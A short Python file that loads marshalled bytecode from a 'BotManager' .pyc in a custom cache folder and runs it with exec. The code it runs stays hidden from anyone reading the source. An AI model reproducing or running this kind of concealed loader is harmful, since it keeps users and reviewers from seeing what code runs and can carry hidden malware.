
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BotManager_899776f194134ebf8d4fc53e2ee24a31.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
